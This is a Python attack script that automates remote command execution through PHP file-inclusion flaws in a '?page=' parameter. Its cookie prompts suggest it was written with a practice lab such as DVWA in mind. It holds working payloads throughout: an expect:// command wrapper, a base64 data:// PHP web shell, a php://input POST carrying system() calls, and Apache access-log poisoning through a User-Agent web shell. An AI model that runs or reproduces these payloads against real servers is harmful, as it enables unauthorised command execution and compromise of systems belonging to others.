#rce.py
import aiohttp
import asyncio
from urllib.parse import quote
from bs4 import BeautifulSoup  # For parsing HTML

# Custom HTTP timeout settings
TIMEOUT = aiohttp.ClientTimeout(total=20)

# Default headers to mimic ffuf's behavior
HEADERS = {
    "User-Agent": "ffuf/v2.1.0-dev",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "keep-alive",
    "Accept-Encoding": "identity",  # Disable compression
}

async def fetch_response(url: str, cookies: dict = None):
    """
    Fetch the response from the given URL with optional cookies.
    """
    try:
        async with aiohttp.ClientSession(headers=HEADERS, timeout=TIMEOUT, cookies=cookies) as session:
            async with session.get(url) as response:
                return await response.text()
    except Exception as e:
        print(f"[-] Error fetching {url}: {e}")
        return None

async def fetch_post_response(url: str, data: str, cookies: dict = None):
    """
    Fetch the response from the given URL using a POST request with optional cookies.
    """
    try:
        async with aiohttp.ClientSession(headers=HEADERS, timeout=TIMEOUT, cookies=cookies) as session:
            async with session.post(url, data=data) as response:
                return await response.text()
    except Exception as e:
        print(f"[-] Error fetching {url}: {e}")
        return None

async def extract_pre_tags_content(html_content: str):
    """
    Extract the content within <pre> tags from the HTML response.
    """
    soup = BeautifulSoup(html_content, 'html.parser')
    pre_tags = soup.find_all('pre')
    if pre_tags:
        return "\n".join(pre.get_text() for pre in pre_tags)
    return None


async def rce_expect():
    """
    Perform RCE using the expect module.
    """
    # Step 1: Ask for cookies
    use_cookies = input("Do you want to specify cookies? (y/n): ").lower()
    cookies = {}
    if use_cookies == "y":
        cookie_input = input("Enter cookies in key=value format (e.g., PHPSESSID=abc123;security=low): ")
        try:
            # Parse cookies into a dictionary
            cookies = dict(cookie.split("=") for cookie in cookie_input.split("; "))
        except ValueError:
            print("[-] Invalid cookie format. Please use 'key=value' pairs separated by ';'.")
            cookies = {}

    # Step 2: Read the base URL from GetResults.txt
    try:
        with open("GetResults.txt", "r") as file:
            base_url = file.read().strip()
            if not base_url.endswith("?page="):
                base_url = base_url.split("?page=")[0] + "?page="
    except FileNotFoundError:
        print("[-] File 'GetResults.txt' not found.")
        return

    # Step 3: Ask for the command to execute
    command = input("What command do you want to run? (e.g., id): ").strip()
    if not command:
        print("[-] No command provided.")
        return

    # Construct the final URL
    final_url = f"{base_url}expect://{command}"

    # Step 4: Fetch the response
    print(f"[+] Sending request to: {final_url}")
    response = await fetch_response(final_url, cookies)

    if response:
        # Step 5: Extract <pre> tags content
        pre_content = await extract_pre_tags_content(response)
        if pre_content:
            print(f"[+] Command output:\n{pre_content}")
        else:
            print("[-] No <pre> tags found in the response.")
    else:
        print("[-] Failed to fetch the response.")

async def rce_data():
    """
    Perform RCE using the data:// wrapper in PHP.
    """
    # Step 1: Ask for cookies
    use_cookies = input("Do you want to specify cookies? (y/n): ").lower()
    cookies = {}
    if use_cookies == "y":
        cookie_input = input("Enter cookies in key=value format (e.g., PHPSESSID=abc123;security=low): ")
        try:
            # Parse cookies into a dictionary
            cookies = dict(cookie.strip().split("=") for cookie in cookie_input.split(";"))
        except ValueError:
            print("[-] Invalid cookie format. Please use 'key=value' pairs separated by ';'.")
            cookies = {}

    # Step 2: Read the base URL from GetResults.txt
    try:
        with open("GetResults.txt", "r") as file:
            base_url = file.read().strip()
            if not base_url.endswith("?page="):
                base_url = base_url.split("?page=")[0] + "?page="
    except FileNotFoundError:
        print("[-] File 'GetResults.txt' not found.")
        return

    # Step 3: Construct the data:// payload
    php_payload = "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg=="

    # Step 4: Ask for the command to execute
    command = input("What command do you want to run? (e.g., id): ").strip()
    if not command:
        print("[-] No command provided.")
        return

    # Construct the final URL with URL-encoded payload
    encoded_payload = quote(php_payload)
    final_url = f"{base_url}{encoded_payload}&cmd={quote(command)}"

    # Step 5: Fetch the response
    print(f"[+] Sending request to: {final_url}")
    response = await fetch_response(final_url, cookies)

    if response:
        # Step 6: Extract the command output before the HTML tags
        try:
            # Split the response at the first occurrence of '<!DOCTYPE html>'
            command_output, _ = response.split('<!DOCTYPE html>', 1)
            command_output = command_output.strip()  # Remove leading/trailing whitespace

            # Check if the extracted output is meaningful
            if command_output:
                print(f"[+] Command output:\n{command_output}")
            else:
                print("[-] No command output found before the HTML tags.")
        except ValueError:
            print("[-] Failed to parse the response. The output may not contain HTML tags.")
    else:
        print("[-] Failed to fetch the response.")

async def rce_post():
    """
    Perform RCE using the php://input wrapper with a POST request.
    """
    # Step 1: Ask for cookies
    use_cookies = input("Do you want to specify cookies? (y/n): ").lower()
    cookies = {}
    if use_cookies == "y":
        cookie_input = input("Enter cookies in key=value format (e.g., PHPSESSID=abc123;security=low): ")
        try:
            # Parse cookies into a dictionary
            cookies = dict(cookie.strip().split("=") for cookie in cookie_input.split(";"))
        except ValueError:
            print("[-] Invalid cookie format. Please use 'key=value' pairs separated by ';'.")
            cookies = {}

    # Step 2: Read the base URL from GetResults.txt
    try:
        with open("GetResults.txt", "r") as file:
            base_url = file.read().strip()
            if not base_url.endswith("?page="):
                base_url = base_url.split("?page=")[0] + "?page="
    except FileNotFoundError:
        print("[-] File 'GetResults.txt' not found.")
        return

    # Step 3: Construct the final URL with php://input
    final_url = f"{base_url}php://input"

    # Step 4: Ask for the command to execute
    command = input("What command do you want to run? (e.g., id): ").strip()
    if not command:
        print("[-] No command provided.")
        return

    # Construct the POST payload
    post_data = f"<?php system('{command}'); ?>"

    # Step 5: Fetch the response
    print(f"[+] Sending POST request to: {final_url}")
    response = await fetch_post_response(final_url, post_data, cookies)

    if response:
        # Step 6: Extract the command output before the HTML tags
        try:
            # Split the response at the first occurrence of '<!DOCTYPE html>'
            command_output, _ = response.split('<!DOCTYPE html>', 1)
            command_output = command_output.strip()  # Remove leading/trailing whitespace

            # Check if the extracted output is meaningful
            if command_output:
                print(f"[+] Command output:\n{command_output}")
            else:
                print("[-] No command output found before the HTML tags.")
        except ValueError:
            print("[-] Failed to parse the response. The output may not contain HTML tags.")
    else:
        print("[-] Failed to fetch the response.")


async def rce_log_poisoning():
    """
    Perform RCE using log poisoning with a custom User-Agent.
    """
    # Step 1: Ask for cookies
    use_cookies = input("Do you want to specify cookies? (y/n): ").lower()
    cookies = {}
    if use_cookies == "y":
        cookie_input = input("Enter cookies in key=value format (e.g., PHPSESSID=abc123;security=low): ")
        try:
            # Parse cookies into a dictionary
            cookies = dict(cookie.strip().split("=") for cookie in cookie_input.split(";"))
        except ValueError:
            print("[-] Invalid cookie format. Please use 'key=value' pairs separated by ';'.")
            cookies = {}

    # Step 2: Read the base URL from GetResults.txt
    try:
        with open("GetResults.txt", "r") as file:
            base_url = file.read().strip()
            if not base_url.endswith("?page="):
                base_url = base_url.split("?page=")[0] + "?page="
    except FileNotFoundError:
        print("[-] File 'GetResults.txt' not found.")
        return

    # Step 3: Ask for the User-Agent string
    user_agent = input("Enter the User-Agent string (e.g., <?php system($_GET['cmd']); ?>): ").strip()

    # Use a default User-Agent if none is provided
    if not user_agent:
        user_agent = "<?php system($_GET['cmd']); ?>"
        print(f"[+] No User-Agent provided. Using default User-Agent: {user_agent}")

    # Step 4: Send a normal web request with the custom User-Agent
    custom_headers = HEADERS.copy()
    custom_headers["User-Agent"] = user_agent
    print(f"[+] Sending request with User-Agent: {user_agent}")
    try:
        async with aiohttp.ClientSession(headers=custom_headers, timeout=TIMEOUT, cookies=cookies) as session:
            async with session.get(base_url) as response:
                if response.status != 200:
                    print(f"[-] Failed to send request. Status code: {response.status}")
                    return
                print("[+] Successfully sent request with custom User-Agent.")
    except Exception as e:
        print(f"[-] Error sending request: {e}")
        return

    # Step 5: Ask for the command to execute
    command = input("What command do you want to run? (e.g., id): ").strip()
    if not command:
        print("[-] No command provided.")
        return

    # Step 6: Construct the final URL
    final_url = f"{base_url}/var/log/apache2/access.log&cmd={quote(command)}"

    # Step 7: Fetch the response
    print(f"[+] Sending request to: {final_url}")
    response = await fetch_response(final_url, cookies)

    if response:
        # Step 8: Extract content above <!DOCTYPE html>
        try:
            # Split the response at the first occurrence of <!DOCTYPE html>
            pre_html_content, _ = response.split("<!DOCTYPE html>", 1)
            pre_html_content = pre_html_content.strip()  # Remove leading/trailing whitespace

            # Check if the extracted content is meaningful
            if pre_html_content:
                print(f"[+] Content above <!DOCTYPE html>:\n{pre_html_content}")
            else:
                print("[-] No content found above <!DOCTYPE html>.")
        except ValueError:
            print("[-] <!DOCTYPE html> not found in the response. Displaying the full response instead.")
            print(f"[+] Full server response:\n{response}")
    else:
        print("[-] Failed to fetch the response.")

# Integrate this function into the main menu
if __name__ == "__main__":
    try:
        asyncio.run(rce_expect())
    except RuntimeError:
        print("[-] Error: An event loop is already running. Try running outside interactive environments like Jupyter Notebook.")